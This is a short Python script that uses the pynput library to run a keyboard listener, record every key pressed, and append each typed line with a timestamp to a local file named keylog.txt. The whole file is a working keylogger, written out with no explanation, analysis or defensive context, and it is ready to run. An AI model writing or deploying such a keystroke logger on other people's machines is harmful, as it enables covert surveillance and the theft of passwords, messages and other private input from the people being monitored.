from pynput import keyboard
from datetime import datetime

log_file = "keylog.txt"
log_buffer = ""

def write_to_file(text):
    with open(log_file, "a") as f:
        f.write(text)
        f.flush()

def on_press(key):
    global log_buffer
    try:
        log_buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log_buffer += " "
        elif key == keyboard.Key.enter:
            write_to_file(f"{datetime.now()}: {log_buffer}\n")
            log_buffer = ""
        elif key == keyboard.Key.backspace:
            log_buffer = log_buffer[:-1]
        else:
            log_buffer += f"<{key.name}>"

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
